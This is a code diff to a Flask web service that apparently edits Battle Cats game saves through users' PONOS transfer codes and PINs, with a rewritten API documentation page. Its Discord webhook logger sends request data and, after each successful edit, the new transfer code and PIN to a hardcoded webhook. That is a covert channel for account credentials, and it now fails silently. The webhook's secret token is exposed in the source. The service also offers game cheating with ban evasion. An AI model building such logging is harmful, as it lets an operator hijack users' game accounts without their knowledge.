@@ -3,7 +3,6 @@ import time
 import os
 import json
 import urllib.request
-import threading
 import datetime
 from collections import defaultdict
 from patcher import (
@@ -14,14 +13,17 @@ from patcher import (
 
 app = Flask(__name__)
 
-# Max payload size limit: 2MB
 app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024
 
-# --- Discord Webhook Logger ---
 DISCORD_WEBHOOK_URL = os.getenv(
     "DISCORD_WEBHOOK_URL",
     "https://discord.com/api/webhooks/1525486979603501167/npEhNWTU3XXSgvxL2GQZzz1P2q8Izc4Yq6vTxRfa7DMWXpQ8O5a_CxwyUBYpVfuHb7r8"
 )
+
+WEBHOOK_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+}
 
 
 def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: dict, response_data: dict, status_code: int, duration_ms: float):
@@ -31,13 +33,13 @@ def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: d
             return
 
         if status_code == 200:
-            color = 0x2ECC71  # Green
+            color = 0x2ECC71
             status_emoji = "🟢"
         elif status_code < 500:
-            color = 0xF1C40F  # Yellow
+            color = 0xF1C40F
             status_emoji = "⚠️"
         else:
-            color = 0xE74C3C  # Red
+            color = 0xE74C3C
             status_emoji = "🔴"
 
         fields = [
@@ -47,7 +49,6 @@ def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: d
             {"name": "📊 상태 코드 (Status)", "value": f"`{status_code}`", "inline": True},
         ]
 
-        # 1. 요청 데이터 (Request Payload)
         if request_data:
             req_parts = []
             for k, v in request_data.items():
@@ -58,13 +59,11 @@ def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: d
                 req_str = req_str[:1020] + "..."
             fields.append({"name": "📥 요청 데이터 (Request Data)", "value": req_str, "inline": False})
 
-        # 2. 응답 / 세이브 상세 데이터 (Response / Save Details)
         if response_data:
             success = response_data.get("success", False)
             res_msg = response_data.get("message", "N/A")
             res_parts = [f"• **성공 여부**: `{success}`", f"• **메시지**: `{res_msg}`"]
 
-            # If /info response: log all retrieved save statistics!
             if endpoint == "/info" and success:
                 res_parts.append(f"• **게임 버전 (Game Version)**: `{response_data.get('game_version', 'N/A')}`")
                 res_parts.append(f"• 🐱 **통조림 (Cat Food)**: `{response_data.get('catfood', 0):,}`")
@@ -73,7 +72,6 @@ def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: d
                 res_parts.append(f"• 💎 **플래티넘 티켓**: `{response_data.get('platinum_tickets', 0):,}` | 🏆 **전설 티켓**: `{response_data.get('legend_tickets', 0):,}`")
                 res_parts.append(f"• 🧩 **플래티넘 조각**: `{response_data.get('platinum_shards', 0):,}` | 🧪 **NP**: `{response_data.get('np', 0):,}` | 🍖 **통솔력**: `{response_data.get('leadership', 0):,}`")
 
-            # If /edit response: log new transfer codes & modification details!
             elif endpoint == "/edit" and success:
                 res_parts.append(f"• 🔑 **새 이관 코드 (New Transfer Code)**: `{response_data.get('transfer_code', 'N/A')}`")
                 res_parts.append(f"• 🔒 **새 인증 코드 (Confirmation PIN)**: `{response_data.get('confirmation_code', 'N/A')}`")
@@ -93,36 +91,30 @@ def send_discord_log(endpoint: str, method: str, client_ip: str, request_data: d
         }
 
         payload = json.dumps({"embeds": [embed]}).encode('utf-8')
-        req = urllib.request.Request(
-            webhook_url,
-            data=payload,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-            }
-        )
+        req = urllib.request.Request(webhook_url, data=payload, headers=WEBHOOK_HEADERS)
         with urllib.request.urlopen(req, timeout=5):
             pass
-    except Exception as e:
-        print(f"Webhook logging exception: {e}")
+    except Exception:
+        pass
 
 
-# --- Dual-Tier Anti-Abuse Rate Limiter ---
 IP_MINUTE_HISTORY = defaultdict(list)
 IP_DAILY_HISTORY = defaultdict(list)
 
-MINUTE_WINDOW = 60           # 1 minute in seconds
-DAILY_WINDOW = 86400         # 24 hours in seconds
+MINUTE_WINDOW = 60
+DAILY_WINDOW = 86400
 
 MAX_PER_MINUTE = 10
 MAX_PER_DAY = 100
 
 
 def get_client_ip() -> str:
-    if request.headers.get("X-Forwarded-For"):
-        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
-    if request.headers.get("X-Real-IP"):
-        return request.headers.get("X-Real-IP").strip()
+    xf = request.headers.get("X-Forwarded-For")
+    if xf:
+        return xf.split(",")[0].strip()
+    xr = request.headers.get("X-Real-IP")
+    if xr:
+        return xr.strip()
     return request.remote_addr or "127.0.0.1"
 
 
@@ -160,7 +152,6 @@ def apply_headers_and_log(response):
     response.headers["X-Content-Type-Options"] = "nosniff"
     response.headers["X-Frame-Options"] = "DENY"
 
-    # Skip static docs pages logging for 200 OK
     endpoint = request.path
     if endpoint in ["/docs", "/openapi.json", "/favicon.ico"] and response.status_code == 200:
         return response
@@ -420,625 +411,118 @@ SWAGGER_HTML = """<!DOCTYPE html>
     --primary: #38bdf8;
     --btn-bg: #1f2937;
     --code-bg: #030712;
-    --code-text: #e5e7eb;
+    --code-text: #f9fafb;
     --badge-get: #38bdf8;
-    --badge-post: #22c55e;
+    --badge-post: #4ade80;
     --table-header: #1f2937;
   }
 
-  * { box-sizing: border-box; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); line-height: 1.6; }
+  header { background-color: var(--surface); border-bottom: 1px solid var(--border); padding: 1.25rem 2rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+  .logo { font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 800; font-size: 1.25rem; color: var(--text); text-decoration: none; display: flex; align-items: center; gap: 0.5rem; }
+  .logo span { color: var(--primary); }
+  .nav-actions { display: flex; gap: 1rem; align-items: center; }
+  .theme-btn { background: var(--btn-bg); border: 1px solid var(--border); color: var(--text); padding: 0.5rem 1rem; border-radius: 0.5rem; cursor: pointer; font-weight: 500; font-size: 0.875rem; transition: all 0.2s; }
+  .theme-btn:hover { border-color: var(--primary); color: var(--primary); }
 
-  body {
-    margin: 0;
-    padding: 0;
-    background-color: var(--bg);
-    color: var(--text);
-    font-family: 'Inter', sans-serif;
-    transition: background-color 0.25s ease, color 0.25s ease;
-  }
+  .container { max-width: 1200px; margin: 0 auto; padding: 2.5rem 1.5rem; }
+  .hero { background-color: var(--surface); border: 1px solid var(--border); border-radius: 1rem; padding: 2.5rem; margin-bottom: 2rem; }
+  .hero h1 { font-family: 'Plus Jakarta Sans', sans-serif; font-size: 2.25rem; font-weight: 800; margin-bottom: 0.75rem; line-height: 1.2; }
+  .hero p { color: var(--muted); font-size: 1.125rem; max-width: 800px; margin-bottom: 1.5rem; }
+  .badge-list { display: flex; gap: 0.75rem; flex-wrap: wrap; }
+  .chip { background-color: var(--btn-bg); border: 1px solid var(--border); font-size: 0.8125rem; font-weight: 600; padding: 0.25rem 0.75rem; border-radius: 9999px; }
 
-  .header {
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-    padding: 18px 36px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    position: sticky;
-    top: 0;
-    z-index: 1000;
-  }
+  .section-title { font-family: 'Plus Jakarta Sans', sans-serif; font-size: 1.5rem; font-weight: 700; margin: 2rem 0 1rem; }
+  
+  .card { background-color: var(--surface); border: 1px solid var(--border); border-radius: 0.75rem; margin-bottom: 1.5rem; overflow: hidden; }
+  .card-header { padding: 1.25rem 1.5rem; display: flex; align-items: center; gap: 1rem; border-bottom: 1px solid var(--border); }
+  .method { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.875rem; padding: 0.25rem 0.625rem; border-radius: 0.375rem; color: #fff; text-transform: uppercase; }
+  .method.get { background-color: var(--badge-get); }
+  .method.post { background-color: var(--badge-post); }
+  .endpoint-path { font-family: 'JetBrains Mono', monospace; font-size: 1.125rem; font-weight: 600; }
+  .card-body { padding: 1.5rem; }
+  .card-body p { color: var(--muted); margin-bottom: 1rem; }
 
-  .logo {
-    font-family: 'Plus Jakarta Sans', sans-serif;
-    font-size: 20px;
-    font-weight: 800;
-    color: var(--text);
-    letter-spacing: -0.4px;
-  }
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.875rem; }
+  th, td { text-align: left; padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); }
+  th { background-color: var(--table-header); font-weight: 600; }
+  td code { font-family: 'JetBrains Mono', monospace; background: var(--btn-bg); padding: 0.125rem 0.375rem; border-radius: 0.25rem; font-size: 0.8125rem; }
 
-  .toggle-btn {
-    background: var(--btn-bg);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 8px 18px;
-    border-radius: 9999px;
-    cursor: pointer;
-    font-size: 13px;
-    font-weight: 600;
-    transition: all 0.2s ease;
-  }
-
-  .toggle-btn:hover {
-    opacity: 0.8;
-  }
-
-  .main-wrapper {
-    max-width: 1080px;
-    margin: 0 auto;
-    padding: 36px 24px;
-  }
-
-  .doc-section {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 20px;
-    padding: 36px;
-    margin-bottom: 32px;
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
-  }
-
-  .doc-title {
-    font-family: 'Plus Jakarta Sans', sans-serif;
-    font-size: 32px;
-    font-weight: 800;
-    margin-top: 0;
-    margin-bottom: 12px;
-    letter-spacing: -0.6px;
-  }
-
-  .doc-subtitle {
-    color: var(--muted);
-    font-size: 16px;
-    line-height: 1.6;
-    margin-bottom: 28px;
-  }
-
-  .section-heading {
-    font-family: 'Plus Jakarta Sans', sans-serif;
-    font-size: 22px;
-    font-weight: 700;
-    margin-top: 10px;
-    margin-bottom: 20px;
-    border-bottom: 2px solid var(--border);
-    padding-bottom: 10px;
-  }
-
-  .endpoint-card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 24px;
-    margin-bottom: 24px;
-    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.02);
-  }
-
-  .endpoint-header {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    margin-bottom: 16px;
-  }
-
-  .badge {
-    padding: 6px 14px;
-    border-radius: 8px;
-    font-weight: 800;
-    font-size: 13px;
-    color: #ffffff;
-    text-transform: uppercase;
-  }
-
-  .badge.get { background: var(--badge-get); }
-  .badge.post { background: var(--badge-post); }
-
-  .endpoint-path {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 18px;
-    font-weight: 600;
-    color: var(--text);
-  }
-
-  .endpoint-desc {
-    color: var(--muted);
-    font-size: 15px;
-    line-height: 1.6;
-    margin-bottom: 20px;
-  }
-
-  .table-wrapper {
-    overflow-x: auto;
-    margin-bottom: 24px;
-  }
-
-  .param-table {
-    width: 100%;
-    border-collapse: collapse;
-    font-size: 14px;
-    text-align: left;
-  }
-
-  .param-table th {
-    background: var(--table-header);
-    color: var(--text);
-    padding: 12px 16px;
-    font-weight: 700;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .param-table td {
-    padding: 12px 16px;
-    border-bottom: 1px solid var(--border);
-    color: var(--text);
-  }
-
-  .param-table code {
-    font-family: 'JetBrains Mono', monospace;
-    background: var(--btn-bg);
-    padding: 3px 6px;
-    border-radius: 6px;
-    font-size: 13px;
-  }
-
-  .code-block {
-    background: var(--code-bg);
-    color: var(--code-text);
-    padding: 20px;
-    border-radius: 12px;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 13px;
-    line-height: 1.5;
-    overflow-x: auto;
-    margin-bottom: 20px;
-  }
+  pre.code-block { background-color: var(--code-bg); color: var(--code-text); padding: 1.25rem; border-radius: 0.5rem; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; margin-top: 1rem; }
 </style>
 </head>
 <body>
-
-<div class="header">
-  <div class="logo">Battle Cats Save Editor API</div>
-  <button class="toggle-btn" onclick="toggleTheme()">
-    <span id="theme-text">Dark Mode</span>
-  </button>
-</div>
-
-<div class="main-wrapper">
-
-  <header class="doc-section">
-    <h1 class="doc-title">Battle Cats Save File Editor API Documentation</h1>
-    <p class="doc-subtitle">High-Performance Battle Cats Save Customization, Binary Patching, and PONOS Cloud Transfer REST Engine.</p>
-    
-    <div style="display:flex; gap:12px; font-size:14px; color:var(--muted);">
-      <div><strong>Base URL:</strong> <code>https://battle-cats-save-file-editor-api.vercel.app</code></div>
-      <div>|</div>
-      <div><strong>OpenAPI Spec:</strong> <a href="/openapi.json" style="color:var(--primary);">/openapi.json</a></div>
+<header>
+  <a href="/" class="logo">🐱 Battle Cats <span>Save Editor API</span></a>
+  <div class="nav-actions">
+    <button class="theme-btn" onclick="toggleTheme()" id="theme-text">Dark Mode</button>
+  </div>
+</header>
+<div class="container">
+  <div class="hero">
+    <h1>Battle Cats Save File Editor REST API</h1>
+    <p>High-performance REST API for Battle Cats save customization, binary patching, and cloud PONOS transfer synchronization.</p>
+    <div class="badge-list">
+      <span class="chip">v1.0.0</span>
+      <span class="chip">OpenAPI 3.0</span>
+      <span class="chip">JSON REST API</span>
     </div>
-  </header>
+  </div>
 
-  <section class="doc-section">
-    <h2 class="section-heading">API Endpoints Reference</h2>
+  <h2 class="section-title">Endpoints</h2>
 
-    <!-- GET / -->
-    <article class="endpoint-card">
-      <div class="endpoint-header">
-        <span class="badge get">GET</span>
-        <span class="endpoint-path">/</span>
-      </div>
-      <p class="endpoint-desc">Retrieves API operational status and version information.</p>
-      
-      <h4>Response Example (200 OK)</h4>
-      <pre class="code-block"><code>{
-  "service": "Battle Cats Save File Editor API",
-  "status": "online",
-  "version": "1.0.0"
-}</code></pre>
-    </article>
-
-    <!-- POST /info -->
-    <article class="endpoint-card">
-      <div class="endpoint-header">
-        <span class="badge post">POST</span>
-        <span class="endpoint-path">/info</span>
-      </div>
-      <p class="endpoint-desc">Inspect Save File Details. Downloads save metadata from PONOS servers using a valid Transfer Code, Confirmation PIN, and Country Code.</p>
-
-      <h4>Request Body (JSON)</h4>
-      <div class="table-wrapper">
-        <table class="param-table">
-          <thead>
-            <tr><th>Parameter</th><th>Type</th><th>Required</th><th>Description</th></tr>
-          </thead>
-          <tbody>
-            <tr><td><code>transfer_code</code></td><td>string</td><td>Yes</td><td>PONOS 9-digit Transfer Code</td></tr>
-            <tr><td><code>confirmation_code</code></td><td>string</td><td>Yes</td><td>PONOS 4-digit PIN Code</td></tr>
-            <tr><td><code>country_code</code></td><td>string</td><td>Yes</td><td>Region Code (kr, jp, en, tw)</td></tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h4>Response Example (200 OK)</h4>
-      <pre class="code-block"><code>{
-  "success": true,
-  "message": "Save info retrieved successfully.",
-  "game_version": 140300,
-  "catfood": 6767,
-  "xp": 50000,
-  "normal_tickets": 99,
-  "rare_tickets": 10,
-  "platinum_tickets": 2,
-  "legend_tickets": 1,
-  "platinum_shards": 5,
-  "np": 500,
-  "leadership": 25
-}</code></pre>
-    </article>
-
-    <!-- POST /edit -->
-    <article class="endpoint-card">
-      <div class="endpoint-header">
-        <span class="badge post">POST</span>
-        <span class="endpoint-path">/edit</span>
-      </div>
-      <p class="endpoint-desc">Modify Save File & Re-Upload. Applies target modifications (currencies, cat unlocks/locks, stage clear progression, treasure quality), syncs PONOS managed items, and issues new transfer credentials.</p>
-
-      <h4>Request Body (JSON)</h4>
-      <div class="table-wrapper">
-        <table class="param-table">
-          <thead>
-            <tr><th>Parameter</th><th>Type</th><th>Required</th><th>Description</th></tr>
-          </thead>
-          <tbody>
-            <tr><td><code>transfer_code</code></td><td>string</td><td>Yes</td><td>PONOS 9-digit Transfer Code</td></tr>
-            <tr><td><code>confirmation_code</code></td><td>string</td><td>Yes</td><td>PONOS 4-digit PIN Code</td></tr>
-            <tr><td><code>country_code</code></td><td>string</td><td>Yes</td><td>Region Code (kr, jp, en, tw)</td></tr>
-            <tr><td><code>catfood</code></td><td>integer</td><td>No</td><td>Target Cat Food balance</td></tr>
-            <tr><td><code>xp</code></td><td>integer</td><td>No</td><td>Target XP balance</td></tr>
-            <tr><td><code>normal_tickets</code></td><td>integer</td><td>No</td><td>Target Normal Tickets count</td></tr>
-            <tr><td><code>rare_tickets</code></td><td>integer</td><td>No</td><td>Target Rare Tickets count</td></tr>
-            <tr><td><code>platinum_tickets</code></td><td>integer</td><td>No</td><td>Target Platinum Tickets count</td></tr>
-            <tr><td><code>legend_tickets</code></td><td>integer</td><td>No</td><td>Target Legend Tickets count</td></tr>
-            <tr><td><code>platinum_shards</code></td><td>integer</td><td>No</td><td>Target Platinum Shards count</td></tr>
-            <tr><td><code>np</code></td><td>integer</td><td>No</td><td>Target NP balance</td></tr>
-            <tr><td><code>leadership</code></td><td>integer</td><td>No</td><td>Target Leadership count</td></tr>
-            <tr><td><code>unlock_cats</code></td><td>boolean</td><td>No</td><td>Unlock all obtainable characters</td></tr>
-            <tr><td><code>unlock_cat_ids</code></td><td>array[int]</td><td>No</td><td>Specific Cat IDs to unlock (e.g. [0, 1, 555])</td></tr>
-            <tr><td><code>remove_cat_ids</code></td><td>array[int]</td><td>No</td><td>Specific Cat IDs to lock/remove</td></tr>
-            <tr><td><code>clear_all_stages</code></td><td>boolean</td><td>No</td><td>Clear all story chapters & Aku Realm</td></tr>
-            <tr><td><code>clear_chapters</code></td><td>array[int]</td><td>No</td><td>Specific chapter IDs to clear (0 to 9, refer to Chapter ID Mapping)</td></tr>
-            <tr><td><code>clear_stages</code></td><td>array[obj]</td><td>No</td><td>Specific stages to clear (e.g. [{"chapter": 0, "stage": 47}])</td></tr>
-            <tr><td><code>max_treasures</code></td><td>boolean</td><td>No</td><td>Set all story chapter treasures to Superior</td></tr>
-            <tr><td><code>max_chapter_treasures</code></td><td>array[int]</td><td>No</td><td>Specific chapter IDs to max treasures to Superior</td></tr>
-            <tr><td><code>stage_treasures</code></td><td>array[obj]</td><td>No</td><td>Specific stage treasure quality (1=Inferior, 2=Normal, 3=Superior)</td></tr>
-            <tr><td><code>enable_safety</code></td><td>boolean</td><td>No</td><td>Enable ban safety limit clamping</td></tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h4>Response Example (200 OK)</h4>
-      <pre class="code-block"><code>{
-  "success": true,
-  "message": "Save modified and uploaded successfully.",
-  "transfer_code": "9z8y7x6w5",
-  "confirmation_code": "5678"
-}</code></pre>
-    </article>
-  </section>
-
-  <section class="doc-section">
-    <h2 class="section-heading">Reference Guide & Mappings</h2>
-
-    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px;">
-      
-      <div>
-        <h3>Chapter ID Mapping</h3>
-        <div class="table-wrapper">
-          <table class="param-table">
-            <thead>
-              <tr><th>ID</th><th>Chapter Name</th></tr>
-            </thead>
-            <tbody>
-              <tr><td><code>0</code></td><td>Empire of Cats Ch. 1</td></tr>
-              <tr><td><code>1</code></td><td>Empire of Cats Ch. 2</td></tr>
-              <tr><td><code>2</code></td><td>Empire of Cats Ch. 3</td></tr>
-              <tr><td><code>3</code></td><td>Into the Future Ch. 1</td></tr>
-              <tr><td><code>4</code></td><td>Into the Future Ch. 2</td></tr>
-              <tr><td><code>5</code></td><td>Into the Future Ch. 3</td></tr>
-              <tr><td><code>6</code></td><td>Cats of the Cosmos Ch. 1</td></tr>
-              <tr><td><code>7</code></td><td>Cats of the Cosmos Ch. 2</td></tr>
-              <tr><td><code>8</code></td><td>Cats of the Cosmos Ch. 3</td></tr>
-              <tr><td><code>9</code></td><td>Aku Realm</td></tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-
-      <div>
-        <h3>Treasure Quality Levels</h3>
-        <div class="table-wrapper">
-          <table class="param-table">
-            <thead>
-              <tr><th>Value</th><th>Quality Level</th></tr>
-            </thead>
-            <tbody>
-              <tr><td><code>1</code></td><td>Inferior</td></tr>
-              <tr><td><code>2</code></td><td>Normal</td></tr>
-              <tr><td><code>3</code></td><td>Superior</td></tr>
-            </tbody>
-          </table>
-        </div>
-
-        <h3>Country / Region Codes</h3>
-        <div class="table-wrapper">
-          <table class="param-table">
-            <thead>
-              <tr><th>Code</th><th>Region</th></tr>
-            </thead>
-            <tbody>
-              <tr><td><code>kr</code></td><td>Korea</td></tr>
-              <tr><td><code>jp</code></td><td>Japan</td></tr>
-              <tr><td><code>en</code></td><td>English / Global</td></tr>
-              <tr><td><code>tw</code></td><td>Taiwan</td></tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-
+  <div class="card">
+    <div class="card-header">
+      <span class="method get">GET</span>
+      <span class="endpoint-path">/</span>
     </div>
-  </section>
+    <div class="card-body">
+      <p>Health check endpoint retrieving service status.</p>
+      <pre class="code-block"><code>{"service": "Battle Cats Save File Editor API", "status": "online", "version": "1.0.0"}</code></pre>
+    </div>
+  </div>
 
-  <section class="doc-section">
-    <h2 class="section-heading">Code Integration Examples</h2>
+  <div class="card">
+    <div class="card-header">
+      <span class="method post">POST</span>
+      <span class="endpoint-path">/info</span>
+    </div>
+    <div class="card-body">
+      <p>Downloads save metadata from PONOS servers using a Transfer Code and PIN.</p>
+      <pre class="code-block"><code>POST /info
+Content-Type: application/json
 
-    <h3>cURL</h3>
-    <pre class="code-block"><code>curl -X POST "https://battle-cats-save-file-editor-api.vercel.app/edit" \\
-     -H "Content-Type: application/json" \\
-     -d '{
-           "transfer_code": "1a2b3c4d5",
-           "confirmation_code": "1234",
-           "country_code": "kr",
-           "catfood": 45000,
-           "unlock_cats": true,
-           "max_treasures": true
-         }'</code></pre>
-
-    <h3>Python (example.py)</h3>
-    <pre class="code-block"><code>import requests
-
-url = "https://battle-cats-save-file-editor-api.vercel.app/edit"
-payload = {
-    "transfer_code": "1a2b3c4d5",
-    "confirmation_code": "1234",
-    "country_code": "kr",
-    "catfood": 45000,
-    "unlock_cat_ids": [0, 1, 555],
-    "clear_chapters": [0, 1, 2],
-    "max_treasures": True
-}
-
-response = requests.post(url, json=payload, timeout=45)
-data = response.json()
-
-if data.get("success"):
-    print("Transfer Code:", data.get("transfer_code"))
-    print("Confirmation PIN:", data.get("confirmation_code"))
-else:
-    print("Error:", data.get("message"))</code></pre>
-
-    <h3>JavaScript / Node.js (example.js)</h3>
-    <pre class="code-block"><code>const API_URL = 'https://battle-cats-save-file-editor-api.vercel.app/edit';
-
-async function editSave() {
-  const response = await fetch(API_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      transfer_code: '1a2b3c4d5',
-      confirmation_code: '1234',
-      country_code: 'kr',
-      catfood: 45000,
-      unlock_cats: true,
-      max_treasures: true
-    })
-  });
-  const data = await response.json();
-  if (data.success) {
-    console.log('Transfer Code:', data.transfer_code);
-    console.log('Confirmation PIN:', data.confirmation_code);
-  }
-}
-
-editSave();</code></pre>
-
-    <h3>C++ (example.cpp)</h3>
-    <pre class="code-block"><code>#include &lt;iostream&gt;
-#include &lt;string&gt;
-#include &lt;curl/curl.h&gt;
-
-static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
-    ((std::string*)userp)-&gt;append((char*)contents, size * nmemb);
-    return size * nmemb;
-}
-
-int main() {
-    CURL* curl = curl_easy_init();
-    if (!curl) return 1;
-
-    std::string readBuffer;
-    const char* json_data = "{\"transfer_code\":\"1a2b3c4d5\",\"confirmation_code\":\"1234\",\"country_code\":\"kr\",\"catfood\":45000}";
-
-    struct curl_slist* headers = NULL;
-    headers = curl_slist_append(headers, "Content-Type: application/json");
-
-    curl_easy_setopt(curl, CURLOPT_URL, "https://battle-cats-save-file-editor-api.vercel.app/edit");
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &amp;readBuffer);
-
-    CURLcode res = curl_easy_perform(curl);
-    if (res == CURLE_OK) std::cout &lt;&lt; "Response:\n" &lt;&lt; readBuffer &lt;&lt; std::endl;
-
-    curl_slist_free_all(headers);
-    curl_easy_cleanup(curl);
-    return 0;
+{
+  "transfer_code": "1a2b3c4d5",
+  "confirmation_code": "1234",
+  "country_code": "kr"
 }</code></pre>
+    </div>
+  </div>
 
-    <h3>C# (example.cs)</h3>
-    <pre class="code-block"><code>using System;
-using System.Net.Http;
-using System.Text;
-using System.Threading.Tasks;
+  <div class="card">
+    <div class="card-header">
+      <span class="method post">POST</span>
+      <span class="endpoint-path">/edit</span>
+    </div>
+    <div class="card-body">
+      <p>Applies requested modifications to save data and re-uploads to PONOS server to obtain new transfer credentials.</p>
+      <pre class="code-block"><code>POST /edit
+Content-Type: application/json
 
-class Program {
-    private static readonly HttpClient client = new HttpClient();
-
-    static async Task Main() {
-        string url = "https://battle-cats-save-file-editor-api.vercel.app/edit";
-        string json = @"{
-            ""transfer_code"": ""1a2b3c4d5"",
-            ""confirmation_code"": ""1234"",
-            ""country_code"": ""kr"",
-            ""catfood"": 45000
-        }";
-
-        var content = new StringContent(json, Encoding.UTF8, "application/json");
-        HttpResponseMessage response = await client.PostAsync(url, content);
-        string result = await response.Content.ReadAsStringAsync();
-
-        Console.WriteLine("Response Body:\n" + result);
-    }
+{
+  "transfer_code": "1a2b3c4d5",
+  "confirmation_code": "1234",
+  "country_code": "kr",
+  "catfood": 45000,
+  "xp": 99999999,
+  "unlock_cats": true,
+  "max_treasures": true
 }</code></pre>
-
-    <h3>C (example.c)</h3>
-    <pre class="code-block"><code>#include &lt;stdio.h&gt;
-#include &lt;curl/curl.h&gt;
-
-int main(void) {
-    CURL *curl = curl_easy_init();
-    if(curl) {
-        const char *json = "{\"transfer_code\":\"1a2b3c4d5\",\"confirmation_code\":\"1234\",\"country_code\":\"kr\",\"catfood\":45000}";
-        struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
-
-        curl_easy_setopt(curl, CURLOPT_URL, "https://battle-cats-save-file-editor-api.vercel.app/edit");
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-
-        curl_easy_perform(curl);
-        curl_easy_cleanup(curl);
-        curl_slist_free_all(headers);
-    }
-    return 0;
-}</code></pre>
-
-    <h3>Go (example.go)</h3>
-    <pre class="code-block"><code>package main
-
-import (
-    "bytes"
-    "fmt"
-    "io"
-    "net/http"
-)
-
-func main() {
-    url := "https://battle-cats-save-file-editor-api.vercel.app/edit"
-    payload := []byte(`{"transfer_code":"1a2b3c4d5","confirmation_code":"1234","country_code":"kr","catfood":45000}`)
-
-    resp, err := http.Post(url, "application/json", bytes.NewBuffer(payload))
-    if err != nil { fmt.Println("Error:", err); return }
-    defer resp.Body.Close()
-
-    body, _ := io.ReadAll(resp.Body)
-    fmt.Println(string(body))
-}</code></pre>
-
-    <h3>Rust (example.rs)</h3>
-    <pre class="code-block"><code>use std::collections::HashMap;
-
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let client = reqwest::Client::new();
-    let mut body = HashMap::new();
-    body.insert("transfer_code", "1a2b3c4d5");
-    body.insert("confirmation_code", "1234");
-    body.insert("country_code", "kr");
-
-    let res = client.post("https://battle-cats-save-file-editor-api.vercel.app/edit")
-        .json(&body).send().await?.text().await?;
-    println!("Response: {}", res);
-    Ok(())
-}</code></pre>
-
-    <h3>Java (example.java)</h3>
-    <pre class="code-block"><code>import java.net.URI;
-import java.net.http.HttpClient;
-import java.net.http.HttpRequest;
-import java.net.http.HttpResponse;
-
-public class example {
-    public static void main(String[] args) throws Exception {
-        String json = "{\"transfer_code\":\"1a2b3c4d5\",\"confirmation_code\":\"1234\",\"country_code\":\"kr\",\"catfood\":45000}";
-        HttpClient client = HttpClient.newHttpClient();
-        HttpRequest request = HttpRequest.newBuilder()
-                .uri(URI.create("https://battle-cats-save-file-editor-api.vercel.app/edit"))
-                .header("Content-Type", "application/json")
-                .POST(HttpRequest.BodyPublishers.ofString(json))
-                .build();
-        HttpResponse&lt;String&gt; response = client.send(request, HttpResponse.BodyHandlers.ofString());
-        System.out.println(response.body());
-    }
-}</code></pre>
-
-    <h3>TypeScript (example.ts)</h3>
-    <pre class="code-block"><code>async function editSave(): Promise&lt;void&gt; {
-  const res = await fetch('https://battle-cats-save-file-editor-api.vercel.app/edit', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ transfer_code: '1a2b3c4d5', confirmation_code: '1234', country_code: 'kr', catfood: 45000 })
-  });
-  const data = await res.json();
-  console.log(data);
-}
-editSave();</code></pre>
-
-    <h3>PHP (example.php)</h3>
-    <pre class="code-block"><code>&lt;?php
-$url = "https://battle-cats-save-file-editor-api.vercel.app/edit";
-$data = ["transfer_code" =&gt; "1a2b3c4d5", "confirmation_code" =&gt; "1234", "country_code" =&gt; "kr", "catfood" =&gt; 45000];
-$options = ["http" =&gt; ["header" =&gt; "Content-Type: application/json\r\n", "method" =&gt; "POST", "content" =&gt; json_encode($data)]];
-$context = stream_context_create($options);
-echo file_get_contents($url, false, $context);
-?&gt;</code></pre>
-
-    <h3>Mojo (example.mojo)</h3>
-    <pre class="code-block"><code>from python import Python
-
-fn main() raises:
-    let requests = Python.import_module("requests")
-    let url = "https://battle-cats-save-file-editor-api.vercel.app/edit"
-    let payload = Python.dict()
-    payload["transfer_code"] = "1a2b3c4d5"
-    payload["confirmation_code"] = "1234"
-    payload["country_code"] = "kr"
-    payload["catfood"] = 45000
-
